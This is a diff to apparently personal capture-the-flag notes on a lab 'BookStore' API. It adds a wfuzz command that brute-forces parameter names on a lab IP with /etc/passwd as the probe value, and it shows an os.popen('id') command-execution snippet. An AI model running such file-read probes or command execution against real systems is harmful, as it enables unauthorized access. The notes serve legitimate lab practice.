@@ -92,6 +92,21 @@ The various routes this API currently provides are:
 /api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
 /api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
 
+### parametr API Enumeration
+
+┌──(duke㉿kali)-[~/Documents/THM_BookStore]
+└─$ wfuzz -w ../../www/wordlists/fuzz-parameters.txt -c --hc 404 -t 40 http://10.10.194.43:5000/api/v1/resources/books?FUZZ=/etc/passwd
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.194.43:5000/api/v1/resources/books?FUZZ=/etc/passwd
+Total requests: 2588
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
 
 
 >>> os.popen('id').read()
